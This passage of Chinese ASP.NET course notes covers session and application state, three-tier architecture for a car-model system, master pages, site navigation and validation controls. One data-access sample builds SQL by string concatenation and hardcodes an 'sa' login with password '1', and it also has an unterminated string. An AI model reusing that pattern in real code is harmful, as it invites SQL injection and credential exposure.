Session对象</span></h4><ul><li><p>和<strong>Cookies</strong>一样，<strong>Session</strong>也是集合，同样可以使用键值对的方式进行访问，但是<strong>Cookie</strong>是保存在客户端的硬盘中，而<strong>Session</strong>是保存在服务器端的内存中。</p></li><li><table><thead><tr><th>成员名称</th><th>成员类型</th><th>说明</th></tr></thead><tbody><tr><td>SessionID</td><td>属性</td><td>获取会话的唯一标识符</td></tr><tr><td>Timeout</td><td>属性</td><td>设置用户超时的时间，单位为分钟。<br>在该段时间内，用户即使没有任何操作，用户状态也不会被清除。<br>注意，此处的设置是针对服务器清除Session的时间而言的，<br>因为如果一段时间内没有操作，服务器是无法知道用户是否在线，<br>所以以超时间为限。而客户端有自己的处理机制，<br>不同的浏览器也不尽相同，一般关闭窗口就会造成Session丢失。</td></tr><tr><td>Clear</td><td>方法</td><td>从会话状态集合中移除所有的键值对。</td></tr><tr><td>Abandon</td><td>方法</td><td>取消当前会话</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200605160354899.png" alt="image-20200605160354899"></p></li></ul><h4><span id="7-application对象">7. Application对象</span></h4><ul><li><strong>Application</strong>对象是应用程序级的对象，用来在所有用户间共享数据，并可以在Web应用程序运行期间持久地保存数据，除非停止Web服务器。</li><li><strong>Application</strong>和<strong>Session</strong>一样，可以使用键值对的方式进行数据的访问。</li><li>修改<strong>Application</strong>对象中的数据时，必须先使用<strong>Lock</strong>方法锁定访问再修改，修改完毕后立即使用<strong>UnLock</strong>方法解除访问锁定。</li><li><img data-src="../images/mdImages/image-20200605160552154.png" alt="image-20200605160552154"></li></ul><h4><span id="8-状态管理技术的区别">8. 状态管理技术的区别</span></h4><ul><li>从<strong>应用范围</strong>方面来说，各种状态管理技术的主要区别如下<ol><li>隐藏域用于同一个页面回发时保留状态，一般用于保存单个页面中需要保留的简单值。</li><li>查询字符串一般用于在页与页之间保持状态，即将简单值从一个页面传递到另一个页面。</li><li><strong>Session</strong>对象用于在一个会话中保持状态。</li><li><strong>Cookie</strong>用于在一个客户端下保持状态。</li><li><strong>Application</strong>在整个应用程序间保持状态。</li></ol></li><li>从<strong>存储方式</strong>方面来说，各种状态管理技术的主要区别如下：<ol><li>隐藏域存储在呈现给客户端的页面中。</li><li>查询字符串将值存储在URL地址中。</li><li>Session对象将数据存储在服务器中，将SessionID属性的值存储在客户端</li><li>Cookie将数据存储在客户端。</li><li>Application将数据存储在服务器的内存中。</li></ol></li></ul><h3><span id="2-总结">2. 总结</span></h3><ul><li><p>常用的系统对象包括<strong>Context</strong>、<strong>Page</strong>、<strong>Response</strong>、<strong>Request</strong>、<strong>Server</strong>、<strong>Cookie</strong>、<strong>Session</strong>和<strong>Application</strong>。</p></li><li><p>解决无状态的技术包括隐藏域、<strong>Cookie</strong>、查询字符串、<strong>Session</strong>对象、<strong>Application</strong>对象等。 </p></li><li><p><strong>Response</strong>对象提供对输出流的访问，<strong>Request</strong>对象提供对输入流的访问，<strong>Server</strong>对象提供了常用工具方法。</p></li><li><p><strong>Cookies</strong>以文件形式存储在客户端的机器上，可以使用<strong>Cookies</strong>长期保存与用户相关的少量信息。</p></li><li><p><strong>Session</strong>对象存储会话级别数据，<strong>Application</strong>对象存储应用程序级别数据。</p></li></ul><h2><span id="第四章-基于三层架构搭建系统">第四章 基于三层架构搭建系统</span></h2><h3><span id="1-为什么需要分层架构">1. <strong>为什么需要分层架构</strong></span></h3><ul><li><img data-src="../images/mdImages/image-20200605161254380.png" alt="image-20200605161254380"></li><li><img data-src="../images/mdImages/image-20200605161304645.png" alt="image-20200605161304645"></li><li><img data-src="../images/mdImages/image-20200605161314204.png" alt="image-20200605161314204"></li><li><img data-src="../images/mdImages/image-20200605161323733.png" alt="image-20200605161323733"></li><li><img data-src="../images/mdImages/image-20200605161335829.png" alt="image-20200605161335829"></li></ul><h3><span id="2-三层结构的优势">2. 三层结构的优势</span></h3><ul><li>项目需求往往随市场的变化而发生变化，三层架构通过将各个功能模块分离，提高了项目的可维护性和代码的可重用性。</li><li>三层结构将各功能模块分离，有利于协作开发。</li><li>eg: <em>基于三层架构的优势，采用三层架构的设计方式，搭建车型系统架构。</em></li></ul><h3><span id="3-模型层">3. 模型层</span></h3><ul><li><p>三层架构中需要传递数据，如需要把数据从数据访问层传递到业务逻辑层，再从业务逻辑层传递到表示层。</p></li><li><p>模型层有时也称为实体层，和三层紧密相关，主要是作为层与层之间数据传递的载体。</p></li><li><p>模型层包含所有与数据库中的表相对应的实体类。</p></li><li><p>模型层提供了一个标准、规范，三层之间的数据传递就是通过传输实体对象或者实体对象集合来达到目的的。</p></li></ul><h4><span id="3-1-创建模型层">3-1 创建模型层</span></h4><ol><li><p>创建解决方案“CarSYS”。</p></li><li><p>在解决方案中，添加模型层对应的项目。<img data-src="../images/mdImages/image-20200605161645380.png" alt="image-20200605161645380"></p></li><li><p>在类库项目中，添加两个类，类名分别为“Brand.cs”和“Car.cs”，在类中分别添加字段和所对应的属性。</p></li><li><p>代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Brand</span><br><span class="line">    &#123;</span><br><span class="line">        private int brandId;</span><br><span class="line">        public int BrandId &#x2F;&#x2F;品牌编号</span><br><span class="line">        &#123;</span><br><span class="line">            get &#123; return brandId; &#125;</span><br><span class="line">            set &#123; brandId &#x3D; value; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     &#x2F;&#x2F;其他代码省略……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3><span id="4-数据访问层">4. 数据访问层</span></h3><ul><li>数据访问层封装了所有与数据库交互的操作。</li><li>数据访问层针对每个数据表提供单纯的增加、查询、修改和删除的操作，不做业务逻辑的判断。</li></ul><h4><span id="4-1-创建数据访问层">4-1 创建数据访问层</span></h4><ol><li><p>在解决方案中，添加“CarSYSDAL”类库项目 。</p></li><li><p>在类库项目中添加类。针对模型层中的每一个类，数据访问层有一个对应的数据访问类，如Car类对应着CarService类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class CarService</span><br><span class="line"> &#123;</span><br><span class="line">        public void AddCar(Car car)&#123;   &#125;</span><br><span class="line">       public bool DeleteCarById(int id)&#123;   &#125;</span><br><span class="line">       public bool ModifyCar(Car car)&#123;    &#125;</span><br><span class="line">       public List&lt;Car&gt; GetCars() &#123;  &#125;</span><br><span class="line">       public Car GetCarById(int id)&#123;   &#125; </span><br><span class="line">       ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4><span id="4-2-添加依赖">4-2 添加依赖</span></h4><ul><li><p>在数据访问层中使用模型层的Car类，通过“添加项目引用”实现数据访问层调用模型层。</p></li><li><p><img data-src="../images/mdImages/image-20200605162207745.png" alt="image-20200605162207745"></p></li><li><p><img data-src="../images/mdImages/image-20200605162213593.png" alt="image-20200605162213593"></p></li><li><p><img data-src="../images/mdImages/image-20200605162220310.png" alt="image-20200605162220310"></p></li><li><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public  void  AddCar(Car car)  </span><br><span class="line">    &#123;</span><br><span class="line">         string constr &#x3D; &quot;server&#x3D;.;uid&#x3D;sa;pwd&#x3D;1;database&#x3D;CarSYS&quot;;</span><br><span class="line">           string sql &#x3D; &quot;insert into car values(&#39;&quot;+car.CarName+&quot;&#39;,&quot;+car.CarBrand.BrandId+&quot;,&#39;&quot;+car.Picture+&quot;&#39;,&quot;+car.OfficialPrice+&quot;,&quot;+car.Click+&quot;)&quot;;</span><br><span class="line">           SqlConnection con &#x3D; new SqlConnection(constr);</span><br><span class="line">           try</span><br><span class="line">           &#123;</span><br><span class="line">               con.Open();</span><br><span class="line">               SqlCommand cmd &#x3D; new SqlCommand(sql, con);</span><br><span class="line">                cmd.ExecuteNonQuery();</span><br><span class="line">                sql &#x3D; &quot;select @@IDENTITY</span><br><span class="line">               cmd.CommandText&#x3D;sql;</span><br><span class="line">               car.CarId&#x3D;Convert.ToInt32(cmd.ExecuteScalar());</span><br><span class="line">           &#125;</span><br><span class="line">         ……</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">public void AddCar(Car car)</span><br><span class="line">       &#123;</span><br><span class="line">        ……</span><br><span class="line">       try</span><br><span class="line">           &#123;</span><br><span class="line">              ……</span><br><span class="line">              cmd.CommandType &#x3D; CommandType.StoredProcedure;&#x2F;&#x2F;命令类型是存储过程</span><br><span class="line">               cmd.CommandText &#x3D; &quot;usp_AddCar&quot;;&#x2F;&#x2F;usp_AddCar是数据库中已经编译成功的存储过程</span><br><span class="line">               SqlParameter[] para &#x3D; new SqlParameter[]&#123;&#x2F;&#x2F;SqlParameter对象数组，保存存储过程中的参数</span><br><span class="line">                   new SqlParameter(&quot;@CarName&quot;,car.CarName),</span><br><span class="line">                    new SqlParameter(&quot;@BrandId&quot;,car.CarBrand.BrandId),</span><br><span class="line">                    new SqlParameter(&quot;@Picture&quot;,car.Picture),</span><br><span class="line">                    ……</span><br><span class="line">              &#125;;</span><br><span class="line">               para[5].Direction &#x3D; ParameterDirection.Output; &#x2F;&#x2F;设置最后一个参数是输出类型的</span><br><span class="line">               foreach (SqlParameter eachPa in para)</span><br><span class="line">               &#123;</span><br><span class="line">                   cmd.Parameters.Add(eachPa);</span><br><span class="line">               &#125;</span><br><span class="line">               cmd.ExecuteNonQuery();</span><br><span class="line">               car.CarId &#x3D; Convert.ToInt32(cmd.Parameters[&quot;@carId&quot;].Value);&#x2F;&#x2F;获取输出参数的值</span><br><span class="line">           &#125;</span><br><span class="line">        ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3><span id="5-业务逻辑层">5. 业务逻辑层</span></h3><ul><li><p>业务逻辑层是表示层与数据访问层的桥梁，负责业务处理和数据传递。</p></li><li><p>业务逻辑层的方法一般与实际需求相关，如用户注册，事实上，用户注册不仅仅是添加一条记录那么简单，它还包含了验证用户名是否已经存在等业务逻辑。</p></li></ul><h4><span id="5-1-创建业务逻辑层">5-1 创建业务逻辑层</span></h4><ol><li><p>在解决方案中，添加“CarSYSBLL”类库项目 。</p></li><li><p>在类库项目中添加类。业务逻辑层中的类也是与模型层中的类相对应。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class CarManager</span><br><span class="line">    &#123;</span><br><span class="line">       CarService cs &#x3D; new CarService();</span><br><span class="line">       public void AddCar(Car car)</span><br><span class="line">       &#123;</span><br><span class="line">             ……</span><br><span class="line">       &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4><span id="5-2-添加依赖">5-2 添加依赖</span></h4><ul><li><p>业务逻辑层的方法不能直接访问数据库，业务逻辑层要添加数据访问层和模型层的引用。</p></li><li><p><img data-src="../images/mdImages/image-20200605162529603.png" alt="image-20200605162529603"></p></li><li><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class CarManager</span><br><span class="line">    &#123;</span><br><span class="line">       CarService cs &#x3D; new CarService();</span><br><span class="line">       public void AddCar(Car car)</span><br><span class="line">       &#123;</span><br><span class="line">            try</span><br><span class="line">           &#123;</span><br><span class="line">               cs.AddCar(car);</span><br><span class="line">           &#125;</span><br><span class="line">           catch (Exception ex)</span><br><span class="line">           &#123;</span><br><span class="line">               throw ex;</span><br><span class="line">           &#125; </span><br><span class="line">     &#125;     </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h3><span id="6-表示层">6. 表示层</span></h3><ul><li><p>表示层负责内容的展现和与用户的交互。</p></li><li><p>表示层给予用户直接的体验，可以说前面的几层都是基础，表示层是最终的应用。</p></li><li><p>在ASP.NET中，表示层就是整个Web站点，即通过页面来实现数据的展示和与用户的交互。</p></li></ul><h4><span id="6-1-创建表示层">6-1 创建表示层</span></h4><ol><li><p>在解决方案中添加“CarSYSWeb网站。</p></li><li><p>表示层的主要内容就是控件+事件。</p></li></ol><h4><span id="6-2-添加依赖">6-2 添加依赖</span></h4><ul><li>在表示层中，需要添加对业务逻辑层和模型层的引用。</li><li><img data-src="../images/mdImages/image-20200605162804727.png" alt="image-20200605162804727"></li><li><img data-src="../images/mdImages/image-20200605162815286.png" alt="image-20200605162815286"></li></ul><h3><span id="7-目录结构">7. 目录结构</span></h3><ul><li><p>在解决方案中，创建了与模型层、数据访问层、业务逻辑层和表示层对应的四个项目。</p></li><li><p>通过引用完成了各个层之间的依赖关系，并在各个项目中，添加了相关的代码，最终完成了增加车型的功能。</p></li><li><p><img data-src="../images/mdImages/image-20200605162915767.png" alt="image-20200605162915767"></p></li><li><p><img data-src="../images/mdImages/image-20200605162921036.png" alt="image-20200605162921036"></p></li></ul><h3><span id="8-总结">8. 总结</span></h3><ul><li><p>三层主要包括数据访问层、业务逻辑层和表示层。</p></li><li><p>模型层有时也称为实体层，和三层紧密相关，主要是作为层与层之间数据传递的载体。</p></li><li><p>数据访问层针对每个数据表提供单纯的增加、查询、修改和删除的操作，不做业务逻辑的判断。</p></li><li><p>业务逻辑层是表示层与数据访问层的桥梁，负责业务处理和数据传递。该部分的方法一般与实际需求相关。</p></li><li><p>表示层负责内容的展现和与用户的交互。它给予用户直接的体验，可以说数据访问层、业务逻辑层是基础，表示层是最终的应用。</p></li><li><p>数据访问层、模型层和业务逻辑层对应的项目是类库，生成的是dll程序集。</p></li><li><p>通过添加引用，建立各个层之间的依赖关系。</p></li></ul><h2><span id="第五章-搭建风格统一的web站点">第五章 搭建风格统一的Web站点</span></h2><h3><span id="1-母版页">1. 母版页</span></h3><ul><li><p>各个页面存在一些相同的部分，比较常见的有页面头部、底部、导航菜单等。</p></li><li><p>ASP.NET提供了母版页技术来提取各个页面中相同的内容，各个页面只需要编写各自的内容，页面和母版页合成形成了最后的页面。</p></li><li><p><img data-src="../images/mdImages/image-20200605163220887.png" alt="image-20200605163220887"></p></li></ul><h3><span id="2-母版页的优点">2. 母版页的优点</span></h3><ul><li><p>有利于站点修改和维护，提高开发人员的开发效率。</p></li><li><p>母版页的页面元素丰富。</p></li><li><p>有利于实现页面布局。</p></li><li><p>提供一种便于利用的对象模型。</p></li></ul><h3><span id="3-创建母版页">3. 创建母版页</span></h3><ol><li><p>打开解决方案“CarSYS.sln”</p></li><li><p>在解决方案资源管理器窗口中，右键网站项目，在右键菜单中选择“添加” <strong>→</strong> “添加新项”  <strong>→</strong>  “母版页。</p></li><li><p><img data-src="../images/mdImages/image-20200605163419874.png" alt="image-20200605163419874"></p></li></ol><h4><span id="3-1-母版页的源文件">3-1 母版页的源文件</span></h4><ul><li><img data-src="../images/mdImages/image-20200605163520957.png" alt="image-20200605163520957"></li></ul><h4><span id="3-2-普通页面与母版页的区别">3-2 普通页面与母版页的区别</span></h4><table><thead><tr><th>区别</th><th>普通页面</th><th>母版页</th></tr></thead><tbody><tr><td>扩展名</td><td>aspx</td><td>master</td></tr><tr><td>可访问性</td><td>可直接在浏览器中访问</td><td>不可以直接在浏览器中访问</td></tr><tr><td>页面指令</td><td>Page</td><td>Master</td></tr><tr><td>ContentPlaceHolder控件</td><td>不可使用</td><td>可使用</td></tr></tbody></table><p><img data-src="../images/mdImages/image-20200605163638176.png" alt="image-20200605163638176"></p><h3><span id="4-创建内容页">4. 创建内容页</span></h3><ul><li><p>母版页是页面的框架，还需要有内容页支撑页面内容。</p></li><li><p>创建内容页的操作与创建普通页面类似， “添加新项”à “Web窗体” à勾选“选择母版页”的复选框。</p></li><li><p><img data-src="../images/mdImages/image-20200605163742083.png" alt="image-20200605163742083"></p></li></ul><h4><span id="4-1-新创建的内容页代码">4-1 新创建的内容页代码</span></h4><p><img data-src="../images/mdImages/image-20200605163840923.png" alt="image-20200605163840923"></p><p><img data-src="../images/mdImages/image-20200605163857491.png" alt="image-20200605163857491"></p><h4><span id="4-2-将现有页面改为内容页">4-2 将现有页面改为内容页</span></h4><ol><li>在@Page指令中设置MasterPageFile属性和Title属性</li></ol><p>2  去除多余的html标签</p><ol start="3"><li><p>去除form标签</p></li><li><p>创建<strong>&lt;asp:Content&gt;</strong>标签，指定对应的<strong>ContentPlaceHolderID</strong>,并放入内容</p></li><li><p><img data-src="../images/mdImages/image-20200605164032977.png" alt="image-20200605164032977"></p></li></ol><h3><span id="5-站点地图">5. 站点地图</span></h3><ul><li><p>在构建大型网站时，管理网站的栏目及所有内容的链接是一项十分复杂的工作。</p></li><li><p>ASP.NET提供了专门的站点导航功能，将网站中所有页面链接以XML文件的方式集中存储在某个位置。</p></li><li><p>集中存储所有页面链接的文件称为站点地图文件，命名为“Web.sitemap”。</p></li><li><p>在网站中，添加站点地图文件，打开“添加新项”窗口，选择“站点地图”。</p></li><li><p><img data-src="../images/mdImages/image-20200605164108865.png" alt="image-20200605164108865"></p></li><li><p><strong>示例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">siteMap</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/AspNet/SiteMap-File-1.0"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">siteMapNode</span> <span class="attr">url</span>=<span class="string">"~\Default.aspx"</span> <span class="attr">title</span>=<span class="string">"车型管理系统"</span>  <span class="attr">description</span>=<span class="string">"管理员控制系统"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">siteMapNode</span> <span class="attr">url</span>=<span class="string">""</span> <span class="attr">title</span>=<span class="string">"用户管理"</span>  <span class="attr">description</span>=<span class="string">""</span> &gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">siteMapNode</span> <span class="attr">url</span>=<span class="string">"~\UsersList.aspx"</span> <span class="attr">title</span>=<span class="string">"用户列表"</span> <span class="attr">description</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">siteMapNode</span> <span class="attr">url</span>=<span class="string">"~\AddUser.aspx"</span> <span class="attr">title</span>=<span class="string">"用户注册"</span> <span class="attr">description</span>=<span class="string">""</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">siteMapNode</span>&gt;</span></span><br><span class="line">     ……</span><br><span class="line">    <span class="tag">&lt;/<span class="name">siteMapNode</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">siteMap</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3><span id="6-treeview控件">6. TreeView控件</span></h3><ul><li><p><strong>TreeView</strong>控件通过树状方式显示站点地图中的节点，实现站点导航功能。</p></li><li><p>使用<strong>TreeView</strong>控件的步骤</p><ol><li><p>在站点中添加“<strong>Web.sitemap</strong>”文件</p></li><li><p>从工具箱的数据栏中拖入“<strong>SiteMapDataSource</strong>”控件</p></li><li><p>从工具箱的导航栏中拖入“<strong>TreeView</strong>”控件，并设置它的数据源即“<strong>DataSourceID</strong>”属性为拖入的“<strong>SiteMapDataSource</strong>”控件的ID</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;menu&quot;&gt;</span><br><span class="line">          &lt;asp:SiteMapDataSource ID&#x3D;&quot;SiteMapDataSource1&quot; runat&#x3D;&quot;server&quot; &#x2F;&gt;</span><br><span class="line">        &lt;asp:TreeView ID&#x3D;&quot;tvMenu&quot; runat&#x3D;&quot;server&quot;  DataSourceID&#x3D;&quot;SiteMapDataSource1&quot;&gt;&lt;&#x2F;asp:TreeView&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li><img data-src="../images/mdImages/image-20200605164317743.png" alt="image-20200605164317743"></li></ol></li></ul><h3><span id="7-sitemappath">7. SiteMapPath</span></h3><ul><li><p>SiteMapPath控件也是常用的导航控件，一般又称为面包屑导航，它将在页面上显示一个导航路径，为用户显示当前页的位置以及返回主页的路径链接。</p></li><li><p>使用SiteMapPath控件的步骤</p><ol><li><p>在站点中添加站点地图文件</p></li><li><p>在页面中拖入SiteMapPath控件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;cph&quot;&gt;</span><br><span class="line"> &lt;p style&#x3D;&quot;font-size:14px; padding:20px&quot;&gt;您当前的位置： </span><br><span class="line">&lt;asp:SiteMapPath ID&#x3D;&quot;SiteMapPath1&quot; runat&#x3D;&quot;server&quot;&gt;&lt;&#x2F;asp:SiteMapPath&gt;&lt;&#x2F;p&gt; </span><br><span class="line">       &lt;asp:ContentPlaceHolder id&#x3D;&quot;ContentPlaceHolder1&quot; runat&#x3D;&quot;server&quot;&gt;    </span><br><span class="line">       &lt;&#x2F;asp:ContentPlaceHolder&gt;</span><br><span class="line"> &lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure></li><li><p><img data-src="../images/mdImages/image-20200605164520867.png" alt="image-20200605164520867"></p></li></ol></li></ul><h3><span id="8-总结">8. <strong>总结</strong></span></h3><ul><li><p>使用母版页，可以为<strong>ASP.NET</strong>应用程序页面创建一个通用的外观</p></li><li><p>母版页可以说是页面的框架，还需要有内容页支撑页面内容创建内容页时，需要勾选“选择母版页”的复选框。</p></li><li><p><strong>ASP.NET</strong>站点导航功能将链接到网站上所有的页面以<strong>XML</strong>文件的方式集中存储在站点地图文件中，通过<strong>SiteMapDataSource</strong>控件向页面提供导航数据来源。</p></li><li><p><strong>TreeView</strong>控件以树状方式提供导航，<strong>SiteMapPath</strong>提供面包屑导航。</p></li></ul><h2><span id="第六章-验证控件和上传控件">第六章 验证控件和上传控件</span></h2><h3><span id="1-数据验证控件">1. 数据验证控件</span></h3><ul><li><p>为了避免异常，在把数据保存到数据库之前，有必要通过技术手段，对有格式要求的数据进行验证。</p></li><li><p>ASP.NET提供了一系列验证控件，以满足各种格式的验证。</p></li><li><p>验证控件主要包括5种验证控件和1个汇总控件。</p></li><li><table><thead><tr><th>控件名称</th><th>说明</th></tr></thead><tbody><tr><td>RequiredFieldValidator</td><td>非空格式验证</td></tr><tr><td>RangeValidator</td><td>范围验证控件</td></tr><tr><td>CompareValidator</td><td>比较验证控件</td></tr><tr><td>RegularExpressionValidator</td><td>正则表达式验证控件</td></tr><tr><td>CustomValidator</td><td>自定义验证控件</td></tr><tr><td>ValidationSummary</td><td>验证信息汇总显示控件</td></tr></tbody></table></li><li><p>验证控件首先检查客户端的脚本是否可用。如果可用，将优先使用客户端的脚本进行验证。在客户端验证通过后，页面才提交给服务器，从而减少了对服务器请求的次数，提高了程序的工作效率。</p></li><li><p>为了确保程序的安全性，在服务器端仍会进行再次验证，从而避免恶意用户绕过客户端向服务器端发送非法数据。</p></li><li><p>程序会在数据验证控件的验证没有通过时，显示设定的错误信息。</p></li></ul><h4><span id="1-requiredfieldvalidator">1. <strong>RequiredFieldValidator</strong></span></h4><ul><li><p><strong>RequiredFieldValidator</strong>控件是最常用的验证控件之一，用于验证必须填写的控件。</p></li><li><p>在验证的目标控件的输入内容为空时显示错误信息，常常和其他验证控件一起实现有效性验证。</p></li><li><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>ControlToValidate</td><td>要验证的控件的ID</td></tr><tr><td>Text</td><td>出错时的提示</td></tr><tr><td>ErrorMessage</td><td>提交给汇总控件的错误信息。如果Text属性为空，则出错时将显示该信息。</td></tr><tr><td>Display</td><td>错误提示文本的显示方式。取值为Static时，无论是否有错误都占据位置，不显示错误时为空白，影响后面内容的位置；取值为Dynamic时，有错误时显示，无错误时不显示且后面的元素占据其位置；取值为None，不管是否存在错误，都不显示错误信息文本</td></tr></tbody></table></li><li><p><img data-src="../images/mdImages/image-20200606141116078.png" alt="image-20200606141116078"></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TextBox ID&#x3D;&quot;txtName&quot; runat&#x3D;&quot;server&quot;&gt;&lt;&#x2F;asp:TextBox&gt;  </span><br><span class="line">              &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator1&quot; runat&#x3D;&quot;server&quot; ErrorMessage&#x3D;&quot;名称必填&quot; Text&#x3D;&quot;*&quot; ControlToValidate&#x3D;&quot;txtName&quot; Display&#x3D;&quot;Dynamic&quot;&gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">……</span><br><span class="line">&lt;asp:DropDownList ID&#x3D;&quot;ddlBrand&quot; runat&#x3D;&quot;server&quot; Width&#x3D;&quot;250&quot; &gt;&lt;&#x2F;asp:DropDownList&gt;</span><br><span class="line">               &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator2&quot; runat&#x3D;&quot;server&quot; ErrorMessage&#x3D;&quot;品牌必选&quot; Text&#x3D;&quot;*&quot; ControlToValidate&#x3D;&quot;ddlBrand&quot; Display&#x3D;&quot;Dynamic&quot; InitialValue&#x3D;&quot;-1&quot; &gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br></pre></td></tr></table></figure><h4><span id="2-rangevalidator">2. <strong>RangeValidator</strong></span></h4><ul><li><p><strong>RangeValidator</strong>控件用于范围检查，常验证输入的值是否在指定的范围之内。</p></li><li><p><strong>RangeValidator</strong>控件会将目标控件中的值转换成Type指定的类型，然后再查看是否在<strong>MinimumValue</strong>和<strong>MaxinumValue</strong>属性指定的范围之内。</p></li><li><p>Type属性支持的类型:</p></li><li><table><thead><tr><th>Type属性值</th><th>说明</th></tr></thead><tbody><tr><td>String</td><td>按字符串比较</td></tr><tr><td>Integer</td><td>按整型数据比较</td></tr><tr><td>Double</td><td>按double双精度浮点数类型比较</td></tr><tr><td>Date</td><td>按日期比较</td></tr><tr><td>Currency</td><td>按货币方式比较</td></tr></tbody></table></li><li><p><strong>RangeValidator</strong>控件常用于整型或日期类型的比较。</p></li><li><p>Type默认值是String,如果按照字符串进行位比较，出现的结果可能与预期完全不同，所以，需要特别注意设置Type属性。 </p></li><li><p><strong>RangeValidator</strong>控件必须在目标控件中有输入值时才进行验证，否则验证控件不会被触发。其他验证控件同样不能在目标控件中输入为空时触发。</p></li><li><p>目标控件中的值可以与<strong>MinimumValue</strong>和<strong>MaxinumValue</strong>属性的值相等。</p></li><li><p><img data-src="../images/mdImages/image-20200606150626663.png" alt="image-20200606150626663"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;asp:TextBox ID&#x3D;&quot;txtBornDate&quot; runat&#x3D;&quot;server&quot; &gt;&lt;&#x2F;asp:TextBox&gt;</span><br><span class="line">      &lt;asp:RequiredFieldValidator ID&#x3D;&quot;RequiredFieldValidator4&quot;   runat&#x3D;&quot;server&quot; ControlToValidate&#x3D;&quot;txtBornDate&quot; Display&#x3D;&quot;Dynamic&quot; ErrorMessage&#x3D;&quot;出生日期必填&quot; Text&#x3D;&quot;*&quot;&gt;&lt;&#x2F;asp:RequiredFieldValidator&gt;</span><br><span class="line">     &lt;asp:RangeValidator ID&#x3D;&quot;RangeValidator1&quot; runat&#x3D;&quot;server&quot; 